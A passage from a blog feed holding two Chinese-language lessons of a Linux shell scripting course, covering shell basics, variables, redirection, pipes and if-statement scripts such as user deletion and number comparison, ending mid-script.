    <content type="html"><![CDATA[<h2 id="教学环境介绍"><a href="#教学环境介绍" class="headerlink" title="教学环境介绍"></a>教学环境介绍</h2><ul><li>client rhel7.2 172.25.0.10</li><li>server rhel7.2 172.25.0.11</li></ul><p>如果真的想走IT这条路，想真正管理好你的主机，那么学习自动化管理工具Shell Scripts 非常重要！</p><p>就是将一些命令放在一起去执行，并且不需要编译就能执行，很方便，所以在日常工作中可以用shell scripts来简化我们的管理。可以但到我们linux中，很多服务的启动都是透过shell脚本来启动的。</p><p>如果你不会脚本，那么服务器出问题的时候，真的会求助无门，所以好好地学习吧！</p><h2 id="shell-简介"><a href="#shell-简介" class="headerlink" title="shell 简介"></a>shell 简介</h2><h3 id="什么是-shell"><a href="#什么是-shell" class="headerlink" title="什么是 shell"></a>什么是 shell</h3><p>Shell 是一个命令解释器 , 是人与操作系统之间的桥梁。</p><p><img src="pic/03.png" alt="03.png"></p><p>我们平时无论任何操作 , 最终都要操作硬件 , 比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板 , 通过主板总线传递到内存 ,CPU, 显卡等 , 最终经过显卡的运 算完成后在屏幕的某个位置 , 显示一个特定字体的字符 “a ”, 这一整个过程可以说是 不断的和硬件打交道了 , 但是如果让人去发送这些硬件操作码显然不适合 , 因为这不是人干 的事 , 所以我们有了操作系统 , 操作系统通过加载一定的硬件驱动 , 从而控制硬件 , 操作硬 件 , 那剩下的事就是如何和操作系统通信了 , 对于普通的系统管理员来说 , 这也是一件非常 困难的事 , 为了方便人和操作系统沟通 , 我们开发了 shell 。</p><p>Shell 可以将我们平时运行的一些指令解释给操作系统执行 , 方便管理员操作系统。 而 Shell 的脚本其实是一种命令的堆积 , 我们将所有需要执行的命令 , 以从上至下的方 式写在一个文件当中 , 交给 shell 去自动解释执行。</p><h3 id="shell-历史"><a href="#shell-历史" class="headerlink" title="shell 历史"></a>shell 历史</h3><p>在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候 , 他们想要为 用户创建一种与他们的新系统交流的方法。 那时的操作系统带有命令解释器。命令解释器接受用户的命令 , 然后解释它们 , 因而计 算机可以使用这些命令。</p><p>但是 Ritchie 和 Thompson 想要的不只是这些功能 , 他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell( 通称为 sh) 的开发 , 由 S.R. Bourne 创 建。自从 Bourne shell 的创建 , 其它 shell 也被一一开发 , 如 C shell(csh) 和 Korn shell(ksh) 。</p><p>当自由软件基金会想寻求一种免费的 shell, 开发者们开始致力于 Bourne shell 以及当 时其它 shell 中某些很受欢迎的功能背后的语言。</p><p>这个开发结果是 Bourne Again Shell, 或称 bash 。虽然你的 Red Hat Linux 包括几 种不同的 shell,bash 是为互动用户提供的默认 shell 。</p><h3 id="常见的-shell"><a href="#常见的-shell" class="headerlink" title="常见的 shell"></a>常见的 shell</h3><ul><li>Bourne shell 即 sh:AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。</li><li>C Shell :Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用 , 他把语法 结构变成了 C 语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。</li><li>korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。</li><li>Bourne-Again Shell: bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写 :Bourne-Again SHell — 这是关于 Bourne shell(sh) 的一个双关语 (Bourne again / born again) 。 Bourne shell 是一个早期的重要 shell, 由 Stephen Bourne 在 1978 年前后编写 , 并同 Version 7 Unix 一起发布。 bash 则在1987 年由 Brian Fox 创造。 在 1990 年 ,Chet Ramey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell, 它能运行于大多数 Unix 风格的操作系统之上 , 甚至被移植到了 MicrosoftWindows 上的 Cygwin 和 MSYS 系统中 , 以实现 windows 的 POSIX 虚拟接口。此外 , 它也被 DJGPP 项目移植到了 MS- DOS 上。</li><li>POSIX shell :POSIX shell 与 Korn shell 非常的相似 , 当前提供 POSIX shell 的最 大卖主是 Hewlett-Packard 。</li></ul><h3 id="为什么-Shell"><a href="#为什么-Shell" class="headerlink" title="为什么 Shell"></a>为什么 Shell</h3><ul><li>解决重复操作的作业。</li><li>节约时间 , 提高工作效率。</li><li>功能强大 , 使用简单。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.查看系统当中合法的shell</span></span><br><span class="line">cat /etc/shells</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">    /bin/sh</span><br><span class="line">    /bin/dash</span><br><span class="line">    /bin/bash</span><br><span class="line">    /bin/rbash</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.修改用户登录时使用的shell程序</span></span><br><span class="line">useradd batman</span><br><span class="line">chsh -s /bin/sh batman</span><br><span class="line">grep batman /etc/passwd</span><br></pre></td></tr></table></figure><pre><code>useradd: Permission denied.useradd: cannot lock /etc/passwd; try again later.chsh: user &apos;batman&apos; does not exist</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.用户的登录流程</span></span><br><span class="line"></span><br><span class="line">![01](pic/01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 对于所有的用户HISTSIZE 500 ，对于root用户HISTSIZE 1000</span></span><br><span class="line">/etc/profile start</span><br><span class="line">/etc/profile end</span><br><span class="line"></span><br><span class="line">~/.bash_profile start</span><br><span class="line">~/.bashrc start</span><br><span class="line">/etc/bashrc start</span><br><span class="line"></span><br><span class="line">/etc/bashrc end</span><br><span class="line">~/.bashrc end</span><br><span class="line">~/.bash_profile end</span><br></pre></td></tr></table></figure><h2 id="shell的变量功能"><a href="#shell的变量功能" class="headerlink" title="shell的变量功能"></a>shell的变量功能</h2><h3 id="什么是变量"><a href="#什么是变量" class="headerlink" title="什么是变量"></a>什么是变量</h3><ul><li>让一个特定的字符代表不固定的内容，有点像y=ax+b,y就是变量，</li><li>用简单的字眼来代替比较复杂或者容易变动的数据，好处就是方便！</li></ul><p>比如系统中的MAIL和USER变量，根据当前登陆的用户而变化</p><ul><li>对脚本的用处——例如ule考试的评分脚本，根据你们的机器号的不同，去检测不同的学生考试成绩</li></ul><h3 id="变量的设置、查看和取消-echo-unset"><a href="#变量的设置、查看和取消-echo-unset" class="headerlink" title="变量的设置、查看和取消 echo unset"></a>变量的设置、查看和取消 echo unset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">        查看echo $&#123;MAIL&#125;</span><br><span class="line">echo $MAIL</span><br><span class="line">设置变量名=变量的内容</span><br><span class="line">myname=booboo</span><br><span class="line">myname="booboo wei"</span><br><span class="line">注意事项</span><br><span class="line">变量命名规则：</span><br><span class="line">1.由数字，字母，下划线_组成</span><br><span class="line">2.不能以数字开头</span><br><span class="line">3.字母区分大小写，大小写敏感</span><br><span class="line">变量内容若有空格，可以使用单引号或者双引号</span><br><span class="line">双引号保留特殊字符原有属性</span><br><span class="line">单引号特殊字符变一般字符（纯文本）</span><br><span class="line">也可使用\跳脱字符将特殊字符变成一般字符</span><br><span class="line">`指令`或$(指令)可以将指令的结果变成变量内容</span><br><span class="line">取消unset 变量名</span><br><span class="line">unset myname</span><br><span class="line">```                </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 课堂练习</span></span></span><br><span class="line">1. 设置变量myname=superman并查看变量的值；</span><br><span class="line">2. 设置变量myname1=I am superman</span><br><span class="line">myname2="I am superman"</span><br><span class="line">myname3='I am superman'并查看所有变量的值；</span><br><span class="line">3. 设置两个变量分别为name1="$myname is myname"和name2='$myname is myname';并查看变量的值；</span><br><span class="line">4. 设置变量kernel的值为当前系统的内核版本号；</span><br><span class="line">5. 设置变量num的值为/etc/目录下所有以.conf结尾的文件的总数；</span><br><span class="line">6. 取消练习中的有所变量。</span><br><span class="line"></span><br><span class="line">![02](pic/02.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 变量内容的删除和替换</span></span></span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">变量设定方式说明</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量<span class="comment">#关键词&#125;若变量内容从头开始的数据符合『关键词』,则将符合的最短数据删除</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量<span class="comment">##关键词&#125; 若变量内容从头开始的数据符合『关键词』,则将符合的最长数据删除</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量%关键词&#125; 若变量内容从尾向前的数据符合『关键词』,则将符合的最短数据删除</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量%%关键词&#125;若变量内容从尾向前的数据符合『关键词』,则将符合的最长数据删除</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量/旧字符串/新字符串&#125; 若变量内容符合『旧字符串』则『第一个旧字符串会被新字符串替换』</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;变量//旧字符串/新字符串&#125;若变量内容符合『旧字符串』则『全部的旧字符串会被新字符串替换』</span></span><br></pre></td></tr></table></figure><h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol><li>设置变量path=${PATH} 并查看；</li><li>设置变量path=/batman/bin:${path}:/superman/bin 并查看；</li><li>读取变量的时候将/batman/bin:及第一个冒号及之前的删除；</li><li>读取变量的时候将最后一个冒号及之前的都删除；</li><li>读取变量的时候将:/superman/bin及最后一个冒号及之后的删除；</li><li>读取变量的时候将第一个冒号及之后的都删除；</li><li>读取变量的时候将第一个sbin替换成SBIN；</li><li>读取变量的时候将所有的sbin替换成SBIN；</li><li>取消练习中的path变量。</li></ol><h3 id="变量的分类：局部变量和全局变量-env-set-export"><a href="#变量的分类：局部变量和全局变量-env-set-export" class="headerlink" title="变量的分类：局部变量和全局变量 env set export"></a>变量的分类：局部变量和全局变量 env set export</h3><ul><li>分类标准    变量是否会被子程序所继续引用；局部变量不会；全局变量会</li><li>env     列出目前shell环境下的所有全局变量</li><li>set     查看所有变量，包括环境变量和局部变量</li><li>export    将局部变量转成全局变量    export myname</li></ul><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 打开一个终端bash，查看该终端的pid号；2. 设置本地变量justice1=&quot;this is local&quot;并查看;3. 设置环境变量justice2=&quot;this is env&quot;并查看;4. 打开子终端bash，查看该终端的pid号和ppid号；5. 在子终端中分别查看变量justice1和justice2的值；</code></pre><h3 id="变量读取、数组与宣告-read-array-declare"><a href="#变量读取、数组与宣告-read-array-declare" class="headerlink" title="变量读取、数组与宣告 read array declare"></a>变量读取、数组与宣告 read array declare</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">read从键盘读取数据存入变量</span><br><span class="line">read -p "plz input yourname:" -t 30 name 按下回车输入变量name的值，会等待30s结束</span><br><span class="line">array</span><br><span class="line">数组的设定A[0]=1;A[1]=2;A[2]=3</span><br><span class="line">A=(1 2 3)</span><br><span class="line">A=(1 2 3 [50]=4)</span><br><span class="line">A=(1 2 3 [50]=4 5)</span><br><span class="line">数组的读取echo $&#123;A[0]&#125;</span><br><span class="line">echo $&#123;A[@]&#125;</span><br><span class="line">echo $&#123;A[*]&#125;</span><br><span class="line">* 代表的是一次取出所有的值 ,@ 代表依次取值</span><br><span class="line">for i in "$A[@]";do echo $i;done</span><br><span class="line">for i in "$A[*]";do echo $i;done</span><br><span class="line">declare</span><br><span class="line">declare 参数</span><br><span class="line">-a 将变量看成数组</span><br><span class="line">-i 将变量看成整数</span><br><span class="line">-r 使变量只读</span><br><span class="line">x=1</span><br><span class="line">y=2</span><br><span class="line">sum=$(($x+$y))</span><br></pre></td></tr></table></figure><h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 用read命令从键盘读取num变量的值，提示语句为“请输入你的机器号：”，限时间20s；2. 设置数组S 第一位为1，第二位为2，第三十位为4，第三十一位为5，读取数组所有的值，读取数组第二位；3. 设置变量x=1，y=2，变量sum=$x+$y，查看sum的值；4. 宣告变量x为整数型值为1，变量y为整数型值为2,变量sum为整数型=$x+$y，查看sum的值；</code></pre><h2 id="数据流重导向redirection"><a href="#数据流重导向redirection" class="headerlink" title="数据流重导向redirection"></a>数据流重导向redirection</h2><h3 id="何谓数据流重导向"><a href="#何谓数据流重导向" class="headerlink" title="何谓数据流重导向"></a>何谓数据流重导向</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">指令执行后的结果有：</span><br><span class="line">          exit    命令执行是否正确的返回值?0正确；！0错误简称代码符号</span><br><span class="line">          return命令执行输出的正确信息standard output    stdout1&gt;或者&gt;&gt;</span><br><span class="line">命令执行输出的错误信息standard error outputstderr22&gt;或者2&gt;&gt;</span><br><span class="line">指令执行前的输入：命令执行输入的信息standard instdin0&lt;或者&lt;&lt;</span><br><span class="line"></span><br><span class="line">用法总结</span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> :以覆盖的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash">&gt;:以追加的方法将『正确的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> :以覆盖的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash">&gt;:以追加的方法将『错误的数据』输出到指定的文件中；</span></span><br><span class="line"></span><br><span class="line">cat从键盘读取数据存入文件</span><br><span class="line">cat &gt; /tmp/catfile 以ctrl+d结束</span><br><span class="line">cat &gt; /tmp/catfile &lt; /tmp/passwd</span><br><span class="line">cat &gt; /tmp/catfile &lt;&lt; ENDF</span><br><span class="line">standard in</span><br><span class="line">ENDF===&gt;结束提示符</span><br></pre></td></tr></table></figure><h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 查看系统/目录下的所有文件名和属性，并记录到/tmp/file文件中；2. 查看系统/var/目录下的所有文件名和属性，并追加记录到/tmp/file文件中；3. 切换到student用户，在/home目录下查找文件名为.bashrc的文件是否存在；4. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息显示到屏幕上，将该命令执行输出的错误信息放到黑洞/dev/null中；5. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中并查看，将该命令执行输出的错误信息放到黑洞/dev/null中；6. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中，将该命令执行输出的错误信息保存到/tmp/stderr文件中，并查看；7. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的所有信息（正确和错误）都保存到/tmp/all中，并查看；8. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件；9. 使用cat命令将/etc/passwd/的内容覆盖/tmp/catfile文件；10. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件，以结束提示符的方式结束；</code></pre><h3 id="命令执行的判断依据-amp-amp"><a href="#命令执行的判断依据-amp-amp" class="headerlink" title="命令执行的判断依据 ; &amp;&amp; ||"></a>命令执行的判断依据 ; &amp;&amp; ||</h3><ul><li>CMD1 &amp;&amp; CMD2     如果前一个命令 (CMD1) 能够正确被执行 , 则执行后一个命令 (CMD2)</li><li>CMD1 || CMD2     如果前一个命令 (CMD1) 被正确执行 , 则不执行后一个命令 (CMD2), 如果前一个命令(CMD1) 执行错误 , 则执行后一个命令 (CMD2).</li><li>CMD1 ; CMD2    命令之间没有关系，从第一个开始执行，不管是否正确执行都会去执行第二个命令</li></ul><h4 id="课堂实验"><a href="#课堂实验" class="headerlink" title="课堂实验"></a>课堂实验</h4><pre><code>1. 创建目录/tmp/cmd,如果创建成功那么就再创建一个目录/tmp/cmd/cdm1;2. 创建目录/tmp/cmd,如果创建失败，那么就再船舰一个目录/tmp/cmd/cmd2;3. 不管目录/tmp/cmd是否创建成功，都会去再创建一个目录/tmp/tmpcmd;</code></pre><h3 id="管道命令pipe"><a href="#管道命令pipe" class="headerlink" title="管道命令pipe"></a>管道命令pipe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   #</span><span class="bash">截取 grep cut</span></span><br><span class="line">grep bash$ /etc/passwd</span><br><span class="line">cut -d : -f 3 /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">排序 sort uniq</span></span><br><span class="line">sort -t: -k3 -n /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">统计 wc</span></span><br><span class="line">wc -l /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">替换 xargs</span></span><br><span class="line">find /sbin/ -perm +7000|wc -l</span><br><span class="line">find /sbin/ -perm +7000|xargs wc -l</span><br><span class="line"></span><br><span class="line">课堂练习：</span><br><span class="line">1.找出/sbin/目录下有特殊权限的文件，并统计每个文件的行数</span><br><span class="line">2.找出/sbin/目录下有特殊权限的文件，并统计有几个</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">减号 -</span></span><br><span class="line">课堂练习：</span><br><span class="line">1.将/home目录打包压缩后解压到/tmp目录</span><br></pre></td></tr></table></figure><h3 id="shell下的特殊符号"><a href="#shell下的特殊符号" class="headerlink" title="shell下的特殊符号"></a>shell下的特殊符号</h3><pre><code>#    注释符\    跳脱符|    管道;    连续指令的下达~    家目录$    取用变量符&amp;    进程控制后台运行!    逻辑运算非/    根目录&gt;,&gt;&gt;    数据流重导向 输出&lt;,&lt;&lt;    数据流重导向 输入&apos;&apos;    特殊字符失效&quot;&quot;    特殊字符有效``    命令执行的结果{}    命令的组合</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;教学环境介绍&quot;&gt;&lt;a href=&quot;#教学环境介绍&quot; class=&quot;headerlink&quot; title=&quot;教学环境介绍&quot;&gt;&lt;/a&gt;教学环境介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;client rhel7.2 172.25.0.10&lt;/li&gt;
&lt;li&gt;server rhel7
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第二课 流程控制语句</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.760Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>shell 的基本组成元素</p><ul><li>1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。</li><li>2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。</li><li>3&gt; 系统命令 :shell 脚本中运行解释的系统命令。</li><li>4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。</li><li>5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。</li></ul></li><li><p>执行脚本的方法</p><ul><li>1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本</li><li>2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限</li></ul></li><li><p>shell的基本语法</p><ul><li>条件判断语句     if test</li><li>循环语句    for while unitl</li><li>其他流程控制     case continue break shift function</li></ul></li></ol><h3 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h3><p>test 判断—————man test 查看的相关的判断指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 数字的判断 字符的判断 文件的判断</span><br><span class="line">-gt 大于 -z 空 -d 文件是不是一个目录</span><br><span class="line">-ge 大于等于 =  字符相等 -f 是不是一个普通文件</span><br><span class="line">-lt 小于 != 字符不相等 -e 文件是不是存在</span><br><span class="line">-le 小于等于 -n 非空 </span><br><span class="line">-ne 不等于 -a 逻辑与</span><br><span class="line">-eq 等于 -o 逻辑或</span><br></pre></td></tr></table></figure><pre><code>注意 ：* [ ] 括号两边有空格* 判断符号两边有空格</code></pre><h3 id="if-语法格式"><a href="#if-语法格式" class="headerlink" title="if 语法格式"></a>if 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if condition--&gt;condition 指的是判断的条件</span><br><span class="line">then</span><br><span class="line">CMD1--&gt; CMD1 指的是满足判断条件后执行的语句</span><br><span class="line">else</span><br><span class="line">CMD2--&gt; CMD2 指的是不满足判断条件执行的语句 then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">CMD1</span><br><span class="line">elif condition</span><br><span class="line">CMD2</span><br><span class="line">else</span><br><span class="line">CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。2. 三个数字比大小，输出最大的3. 三个数字比大小,并且按从大到小排列</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">n1=<span class="variable">$1</span></span><br><span class="line">n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">n1=<span class="variable">$2</span></span><br><span class="line">n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">max=<span class="variable">$n1</span></span><br><span class="line"><span class="keyword">if</span> 